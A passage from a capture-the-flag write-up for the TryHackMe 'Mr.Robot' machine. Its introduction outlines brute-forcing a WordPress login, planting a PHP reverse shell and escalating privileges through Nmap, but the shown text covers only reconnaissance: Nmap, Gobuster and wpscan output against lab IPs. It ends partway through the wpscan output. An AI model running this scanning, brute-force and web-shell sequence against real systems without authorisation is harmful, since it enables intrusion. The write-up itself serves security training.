<html><head><meta content="text/html; charset=UTF-8" http-equiv="content-type"><style type="text/css">.lst-kix_urjnkmzev8cy-7>li:before{content:"\0025cb  "}.lst-kix_urjnkmzev8cy-8>li:before{content:"\0025a0  "}ul.lst-kix_urjnkmzev8cy-2{list-style-type:none}ul.lst-kix_urjnkmzev8cy-1{list-style-type:none}ul.lst-kix_urjnkmzev8cy-0{list-style-type:none}ul.lst-kix_urjnkmzev8cy-6{list-style-type:none}ul.lst-kix_m9wvxovpy36o-4{list-style-type:none}ul.lst-kix_urjnkmzev8cy-5{list-style-type:none}ul.lst-kix_m9wvxovpy36o-5{list-style-type:none}ul.lst-kix_urjnkmzev8cy-4{list-style-type:none}ul.lst-kix_m9wvxovpy36o-2{list-style-type:none}ul.lst-kix_urjnkmzev8cy-3{list-style-type:none}ul.lst-kix_m9wvxovpy36o-3{list-style-type:none}ul.lst-kix_36le3ofcbthj-8{list-style-type:none}ul.lst-kix_m9wvxovpy36o-8{list-style-type:none}ul.lst-kix_urjnkmzev8cy-8{list-style-type:none}ul.lst-kix_m9wvxovpy36o-6{list-style-type:none}ul.lst-kix_urjnkmzev8cy-7{list-style-type:none}ul.lst-kix_m9wvxovpy36o-7{list-style-type:none}ul.lst-kix_36le3ofcbthj-4{list-style-type:none}ul.lst-kix_36le3ofcbthj-5{list-style-type:none}ul.lst-kix_36le3ofcbthj-6{list-style-type:none}ul.lst-kix_36le3ofcbthj-7{list-style-type:none}ul.lst-kix_36le3ofcbthj-0{list-style-type:none}ul.lst-kix_m9wvxovpy36o-0{list-style-type:none}ul.lst-kix_36le3ofcbthj-1{list-style-type:none}ul.lst-kix_m9wvxovpy36o-1{list-style-type:none}ul.lst-kix_36le3ofcbthj-2{list-style-type:none}.lst-kix_vkif30pfzy5o-8>li:before{content:"\0025a0  "}ul.lst-kix_36le3ofcbthj-3{list-style-type:none}.lst-kix_36le3ofcbthj-6>li:before{content:"\0025cf  "}.lst-kix_m9wvxovpy36o-1>li:before{content:"\0025cb  "}.lst-kix_m9wvxovpy36o-2>li:before{content:"\0025a0  "}.lst-kix_36le3ofcbthj-5>li:before{content:"\0025a0  "}.lst-kix_m9wvxovpy36o-3>li:before{content:"\0025cf  "}.lst-kix_36le3ofcbthj-4>li:before{content:"\0025cb  "}ul.lst-kix_vkif30pfzy5o-5{list-style-type:none}.lst-kix_m9wvxovpy36o-5>li:before{content:"\0025a0  "}ul.lst-kix_vkif30pfzy5o-6{list-style-type:none}ul.lst-kix_vkif30pfzy5o-3{list-style-type:none}.lst-kix_m9wvxovpy36o-4>li:before{content:"\0025cb  "}.lst-kix_m9wvxovpy36o-6>li:before{content:"\0025cf  "}.lst-kix_vkif30pfzy5o-1>li:before{content:"\0025cb  "}.lst-kix_vkif30pfzy5o-3>li:before{content:"\0025cf  "}ul.lst-kix_vkif30pfzy5o-4{list-style-type:none}.lst-kix_36le3ofcbthj-1>li:before{content:"\0025cb  "}.lst-kix_36le3ofcbthj-3>li:before{content:"\0025cf  "}ul.lst-kix_vkif30pfzy5o-7{list-style-type:none}.lst-kix_vkif30pfzy5o-0>li:before{content:"\0025cf  "}.lst-kix_vkif30pfzy5o-4>li:before{content:"\0025cb  "}ul.lst-kix_vkif30pfzy5o-8{list-style-type:none}.lst-kix_36le3ofcbthj-2>li:before{content:"\0025a0  "}.lst-kix_m9wvxovpy36o-0>li:before{content:"\0025cf  "}.lst-kix_m9wvxovpy36o-8>li:before{content:"\0025a0  "}.lst-kix_vkif30pfzy5o-5>li:before{content:"\0025a0  "}.lst-kix_vkif30pfzy5o-7>li:before{content:"\0025cb  "}.lst-kix_36le3ofcbthj-7>li:before{content:"\0025cb  "}.lst-kix_m9wvxovpy36o-7>li:before{content:"\0025cb  "}.lst-kix_vkif30pfzy5o-6>li:before{content:"\0025cf  "}.lst-kix_36le3ofcbthj-0>li:before{content:"\0025cf  "}.lst-kix_36le3ofcbthj-8>li:before{content:"\0025a0  "}.lst-kix_vkif30pfzy5o-2>li:before{content:"\0025a0  "}.lst-kix_urjnkmzev8cy-5>li:before{content:"\0025a0  "}.lst-kix_urjnkmzev8cy-6>li:before{content:"\0025cf  "}.lst-kix_urjnkmzev8cy-2>li:before{content:"\0025a0  "}.lst-kix_urjnkmzev8cy-3>li:before{content:"\0025cf  "}.lst-kix_urjnkmzev8cy-4>li:before{content:"\0025cb  "}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_urjnkmzev8cy-1>li:before{content:"\0025cb  "}ul.lst-kix_vkif30pfzy5o-1{list-style-type:none}.lst-kix_urjnkmzev8cy-0>li:before{content:"\0025cf  "}ul.lst-kix_vkif30pfzy5o-2{list-style-type:none}ul.lst-kix_vkif30pfzy5o-0{list-style-type:none}ol{margin:0;padding:0}table td,table th{padding:0}.c6{margin-left:36pt;padding-top:12pt;padding-left:0pt;padding-bottom:12pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c15{color:#efefef;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:14pt;font-family:"Arial";font-style:normal}.c18{padding-top:16pt;padding-bottom:4pt;line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c1{color:#efefef;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.c10{padding-top:18pt;padding-bottom:6pt;line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.c2{padding-top:0pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c0{padding-top:18pt;padding-bottom:4pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c4{padding-top:0pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:center}.c11{padding-top:12pt;padding-bottom:12pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c14{padding-top:14pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c13{text-decoration:none;vertical-align:baseline;font-size:17pt;font-family:"Arial";font-style:normal}.c7{text-decoration-skip-ink:none;font-size:11pt;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c19{background-color:#0c343d;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c9{padding:0;margin:0}.c12{color:#efefef;font-weight:700}.c5{color:#efefef;font-size:11pt}.c8{color:inherit;text-decoration:inherit}.c16{font-size:10.5pt}.c3{height:11pt}.c17{color:#efefef}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c19 doc-content"><p class="c4"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 454.50px; height: 454.50px;"><img alt="" src="images/image5.png" style="width: 454.50px; height: 454.50px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span class="c1">&nbsp; &#8203; </span></p><h3 class="c18" id="h.61dyiwmf39nu"><span class="c5">Mr.Robot is an Easy difficulty Linux machine of </span><span class="c7"><a class="c8" href="https://www.google.com/url?q=https://tryhackme.com&amp;sa=D&amp;source=editors&amp;ust=1657519816390943&amp;usg=AOvVaw3q5229kX4Q8KGZPOZ-Tu2r">TryHackMe</a></span><span class="c1">. Here we will find a Wordpress site and we will take advantage of a provided dictionary to attack the login form, allowing us to put a php reverse shell on the site to get a foothold.After that, Linux Smart Enum will show us that we have access to Nmap that is owned by root and that&rsquo;s our Privilege Escalation.</span></h3><p class="c11"><span class="c1">&nbsp;</span></p><hr><p class="c2 c3"><span class="c1"></span></p><p class="c11"><span class="c1">&nbsp;</span></p><h2 class="c0" id="h.k799805x4b9o"><span class="c13 c12">ENUMERATION</span></h2><p class="c11"><span class="c1">Lets begin as always with an Nmap Scan:</span></p><p class="c2"><span class="c1">[+] Nmap XML import started</span></p><p class="c2"><span class="c1">[+] =====================</span></p><p class="c2"><span class="c1">[+] Processing: 10.10.96.6</span></p><p class="c2"><span class="c1">[+] Searching for IP: 10.10.96.6</span></p><p class="c2"><span class="c1">[+] Host found: /e/86O4kmxp#host/Da0ZQRNx</span></p><p class="c2"><span class="c1">[+] Adding port: 22 / tcp / closed / ssh</span></p><p class="c2"><span class="c1">[+] Adding port: 80 / tcp / open / http / Apache httpd</span></p><p class="c2"><span class="c1">[+] Adding port: 443 / tcp / open / http / Apache httpd</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1.00px; height: 1.00px;"><img alt="" src="images/image1.gif" style="width: 1.00px; height: 1.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 14.67px; height: 14.67px;"><img alt="" src="images/image1.gif" style="width: 14.67px; height: 14.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="Click and drag to move"></span></p><h2 class="c0" id="h.97u1uhsxo3c5"><span class="c13 c12">WEB SITE</span></h2><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 164.00px;"><img alt="" src="images/image2.png" style="width: 624.00px; height: 164.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">After someanumeration of the site we find:</span></p><ul class="c9 lst-kix_urjnkmzev8cy-0 start"><li class="c6 li-bullet-0"><span class="c1">WordPress 4.3.1</span></li><li class="c6 li-bullet-0"><span class="c1">PHP 5.5.29</span></li><li class="c6 li-bullet-0"><span class="c1">X-Mod-Pagespeed 1.9.32.3-4523</span></li><li class="c6 li-bullet-0"><span class="c1">jQuery 2.1.3</span></li></ul><p class="c2"><span class="c1">Lets use Gobuster to see if we can get some interesting files/dirs</span></p><p class="c2"><span class="c1">&#9484;&#9472;&#9472;(root&#12927;Kali)-[~]</span></p><p class="c2"><span class="c1">&#9492;&#9472;# gobuster dir -u http://10.10.96.6 -w /usr/share/seclists/Discovery/Web-Content/common.txt</span></p><p class="c2"><span class="c1">===============================================================</span></p><p class="c2"><span class="c1">Gobuster v3.1.0</span></p><p class="c2"><span class="c1">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></p><p class="c2"><span class="c1">===============================================================</span></p><p class="c2"><span class="c1">[+] Url: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; http://10.10.212.109</span></p><p class="c2"><span class="c1">[+] Method: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;GET</span></p><p class="c2"><span class="c1">[+] Threads: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 10</span></p><p class="c2"><span class="c1">[+] Wordlist: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;/usr/share/seclists/Discovery/Web-Content/common.txt</span></p><p class="c2"><span class="c1">[+] Negative Status codes: &nbsp; 404</span></p><p class="c2"><span class="c1">[+] User Agent: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;gobuster/3.1.0</span></p><p class="c2"><span class="c1">[+] Timeout: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 10s</span></p><p class="c2"><span class="c1">===============================================================</span></p><p class="c2"><span class="c1">2022/07/05 21:19:02 Starting gobuster in directory enumeration mode</span></p><p class="c2"><span class="c1">===============================================================</span></p><p class="c2"><span class="c1">/.hta &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 403) [Size: 213]</span></p><p class="c2"><span class="c1">/.htaccess &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 403) [Size: 218]</span></p><p class="c2"><span class="c1">/.htpasswd &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 403) [Size: 218]</span></p><p class="c2"><span class="c1">/0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 301) [Size: 0] [--&gt; http://10.10.212.109/0/]</span></p><p class="c2"><span class="c1">/Image &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 301) [Size: 0] [--&gt; http://10.10.212.109/Image/]</span></p><p class="c2"><span class="c1">/admin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 301) [Size: 235] [--&gt; http://10.10.212.109/admin/]</span></p><p class="c2"><span class="c1">/atom &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 301) [Size: 0] [--&gt; http://10.10.212.109/feed/atom/]</span></p><p class="c2"><span class="c1">/audio &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 301) [Size: 235] [--&gt; http://10.10.212.109/audio/]</span></p><p class="c2"><span class="c1">/blog &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 301) [Size: 234] [--&gt; http://10.10.212.109/blog/]</span></p><p class="c2"><span class="c1">/css &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 301) [Size: 233] [--&gt; http://10.10.212.109/css/]</span></p><p class="c2"><span class="c1">/dashboard &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 302) [Size: 0] [--&gt; http://10.10.212.109/wp-admin/]</span></p><p class="c2"><span class="c1">/favicon.ico &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 200) [Size: 0]</span></p><p class="c2"><span class="c1">/feed &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 301) [Size: 0] [--&gt; http://10.10.212.109/feed/]</span></p><p class="c2"><span class="c1">/images &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 301) [Size: 236] [--&gt; http://10.10.212.109/images/]</span></p><p class="c2"><span class="c1">/image &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 301) [Size: 0] [--&gt; http://10.10.212.109/image/]</span></p><p class="c2"><span class="c1">/index.html &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 200) [Size: 1077]</span></p><p class="c2"><span class="c1">/index.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 301) [Size: 0] [--&gt; http://10.10.212.109/]</span></p><p class="c2"><span class="c1">/intro &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 200) [Size: 516314]</span></p><p class="c2"><span class="c1">/js &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 301) [Size: 232] [--&gt; http://10.10.212.109/js/]</span></p><p class="c2"><span class="c1">/license &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 200) [Size: 309]</span></p><p class="c2"><span class="c1">/login &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 302) [Size: 0] [--&gt; http://10.10.212.109/wp-login.php]</span></p><p class="c2"><span class="c1">/page1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 301) [Size: 0] [--&gt; http://10.10.212.109/]</span></p><p class="c2"><span class="c1">/phpmyadmin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 403) [Size: 94]</span></p><p class="c2"><span class="c1">/readme &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 200) [Size: 64]</span></p><p class="c2"><span class="c1">/rdf &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 301) [Size: 0] [--&gt; http://10.10.212.109/feed/rdf/]</span></p><p class="c2"><span class="c1">/render/https://www.google.com (Status: 301) [Size: 0] [--&gt; http://10.10.212.109/render/https:/www.google.com]</span></p><p class="c2"><span class="c1">/robots &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 200) [Size: 41]</span></p><p class="c2"><span class="c1">/robots.txt &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 200) [Size: 41]</span></p><p class="c2"><span class="c1">/rss &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 301) [Size: 0] [--&gt; http://10.10.212.109/feed/]</span></p><p class="c2"><span class="c1">/rss2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 301) [Size: 0] [--&gt; http://10.10.212.109/feed/]</span></p><p class="c2"><span class="c1">/sitemap &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 200) [Size: 0]</span></p><p class="c2"><span class="c1">/sitemap.xml &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 200) [Size: 0]</span></p><p class="c2"><span class="c1">/video &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 301) [Size: 235] [--&gt; http://10.10.212.109/video/]</span></p><p class="c2"><span class="c1">/wp-admin &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 301) [Size: 238] [--&gt; http://10.10.212.109/wp-admin/]</span></p><p class="c2"><span class="c1">/wp-content &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 301) [Size: 240] [--&gt; http://10.10.212.109/wp-content/]</span></p><p class="c2"><span class="c1">/wp-includes &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 301) [Size: 241] [--&gt; http://10.10.212.109/wp-includes/]</span></p><p class="c2"><span class="c1">/wp-cron &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 200) [Size: 0]</span></p><p class="c2"><span class="c1">/wp-config &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 200) [Size: 0]</span></p><p class="c2"><span class="c1">/wp-links-opml &nbsp; &nbsp; &nbsp; &nbsp;(Status: 200) [Size: 227]</span></p><p class="c2"><span class="c1">/wp-load &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 200) [Size: 0]</span></p><p class="c2"><span class="c1">/wp-login &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 200) [Size: 2671]</span></p><p class="c2"><span class="c1">/wp-mail &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 500) [Size: 3064]</span></p><p class="c2"><span class="c1">/wp-settings &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 500) [Size: 0]</span></p><p class="c2"><span class="c1">/wp-signup &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(Status: 302) [Size: 0] [--&gt; http://10.10.212.109/wp-login.php?action=register]</span></p><p class="c2"><span class="c1">/xmlrpc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 405) [Size: 42]</span></p><p class="c2"><span class="c1">/xmlrpc.php &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 405) [Size: 42]</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">===============================================================</span></p><p class="c2"><span class="c1">2022/07/05 22:01:19 Finished</span></p><p class="c2"><span class="c1">===============================================================</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1.00px; height: 1.00px;"><img alt="" src="images/image1.gif" style="width: 1.00px; height: 1.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 14.67px; height: 14.67px;"><img alt="" src="images/image1.gif" style="width: 14.67px; height: 14.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="Click and drag to move"></span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">Ok, so we got us /robots.txt and /wp-login. Lets check the robots.txt</span></p><p class="c2"><span class="c1">User-agent: *</span></p><p class="c2"><span class="c1">fsocity.dic</span></p><p class="c2"><span class="c1">key-1-of-3.txt</span></p><p class="c2"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 1.00px; height: 1.00px;"><img alt="" src="images/image1.gif" style="width: 1.00px; height: 1.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 14.67px; height: 14.67px;"><img alt="" src="images/image1.gif" style="width: 14.67px; height: 14.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title="Click and drag to move"></span></p><ul class="c9 lst-kix_m9wvxovpy36o-0 start"><li class="c6 li-bullet-0"><span class="c1">key-1-of-3.txt: The 1st key</span></li><li class="c6 li-bullet-0"><span class="c1">fsocity.dic: File to download (Wordlist)</span></li></ul><p class="c2"><span class="c1">Lets search for vulns on our Wordpress using wpscan.</span></p><p class="c2"><span class="c1">wpscan --url http://10.10.187.95 -e</span></p><p class="c2"><span class="c1">_______________________________________________________________</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;__ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;_______ &nbsp; _____</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\ \ &nbsp; &nbsp; &nbsp; &nbsp;/ / &nbsp;__ \ / ____|</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \ \ &nbsp;/\ &nbsp;/ /| |__) | (___ &nbsp; ___ &nbsp;__ _ _ __ &reg;</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\ \/ &nbsp;\/ / | &nbsp;___/ \___ \ / __|/ _` | &#39;&#39;_ \</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \ &nbsp;/\ &nbsp;/ &nbsp;| | &nbsp; &nbsp; ____) | (__| (_| | | | |</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;\/ &nbsp;\/ &nbsp; |_| &nbsp; &nbsp;|_____/ \___|\__,_|_| |_|</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;WordPress Security Scanner by the WPScan Team</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Version 3.8.22</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp;Sponsored by Automattic - https://automattic.com/</span></p><p class="c2"><span class="c1">&nbsp; &nbsp; &nbsp; &nbsp;@_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></p><p class="c2"><span class="c1">_______________________________________________________________</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[+] URL: http://10.10.187.95/ [10.10.187.95]</span></p><p class="c2"><span class="c1">[+] Started: Fri Jul &nbsp;8 22:48:32 2022</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">Interesting Finding(s):</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[+] Headers</span></p><p class="c2"><span class="c1">&nbsp;| Interesting Entries:</span></p><p class="c2"><span class="c1">&nbsp;| &nbsp;- Server: Apache</span></p><p class="c2"><span class="c1">&nbsp;| &nbsp;- X-Mod-Pagespeed: 1.9.32.3-4523</span></p><p class="c2"><span class="c1">&nbsp;| Found By: Headers (Passive Detection)</span></p><p class="c2"><span class="c1">&nbsp;| Confidence: 100%</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[+] robots.txt found: http://10.10.187.95/robots.txt</span></p><p class="c2"><span class="c1">&nbsp;| Found By: Robots Txt (Aggressive Detection)</span></p><p class="c2"><span class="c1">&nbsp;| Confidence: 100%</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[+] XML-RPC seems to be enabled: http://10.10.187.95/xmlrpc.php</span></p><p class="c2"><span class="c1">&nbsp;| Found By: Direct Access (Aggressive Detection)</span></p><p class="c2"><span class="c1">&nbsp;| Confidence: 100%</span></p><p class="c2"><span class="c1">&nbsp;| References:</span></p><p class="c2"><span class="c1">&nbsp;| &nbsp;- http://codex.wordpress.org/XML-RPC_Pingback_API</span></p><p class="c2"><span class="c1">&nbsp;| &nbsp;- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span></p><p class="c2"><span class="c1">&nbsp;| &nbsp;- https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span></p><p class="c2"><span class="c1">&nbsp;| &nbsp;- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span></p><p class="c2"><span class="c1">&nbsp;| &nbsp;- https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[+] The external WP-Cron seems to be enabled: http://10.10.187.95/wp-cron.php</span></p><p class="c2"><span class="c1">&nbsp;| Found By: Direct Access (Aggressive Detection)</span></p><p class="c2"><span class="c1">&nbsp;| Confidence: 60%</span></p><p class="c2"><span class="c1">&nbsp;| References:</span></p><p class="c2"><span class="c1">&nbsp;| &nbsp;- https://www.iplocation.net/defend-wordpress-from-ddos</span></p><p class="c2"><span class="c1">&nbsp;| &nbsp;- https://github.com/wpscanteam/wpscan/issues/1299</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).</span></p><p class="c2"><span class="c1">&nbsp;| Found By: Emoji Settings (Passive Detection)</span></p><p class="c2"><span class="c1">&nbsp;| &nbsp;- http://10.10.187.95/373ff23.html, Match: &#39;wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1&#39;</span></p><p class="c2"><span class="c1">&nbsp;| Confirmed By: Meta Generator (Passive Detection)</span></p><p class="c2"><span class="c1">&nbsp;| &nbsp;- http://10.10.187.95/373ff23.html, Match: &#39;WordPress 4.3.1&#39;</span></p><p class="c2 c3"><span class="c1"></span></p><p class="c2"><span class="c1">[+] WordPress theme in use: twentyfifteen</span></p><p 